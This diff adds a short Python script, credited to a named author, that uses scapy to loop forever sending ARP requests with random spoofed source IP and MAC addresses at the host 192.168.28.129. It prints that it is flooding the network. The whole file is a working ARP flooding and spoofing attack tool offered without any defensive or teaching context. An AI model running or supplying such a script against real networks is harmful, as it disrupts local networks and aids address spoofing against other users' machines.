@@ -1,0 +1,19 @@
+#!/usr/bin/python
+
+"""Author: Doğukan SANER"""
+
+import sys
+from scapy.all import *
+
+while 1:
+        packet = Ether()/ARP(op=1, psrc=RandIP("192.168.28.*"), pdst="192.168.28.129", hwsrc=RandMAC())
+        print packet.psrc
+        print packet.hwsrc
+        if len(sys.argv) < 2:
+            dev = "eth0"
+        else:
+            dev = sys.argv[1]
+
+        print "Flooding net with random packets on dev " + dev
+
+        sendp(packet, inter = 0, iface = dev, loop = 0, verbose = None)
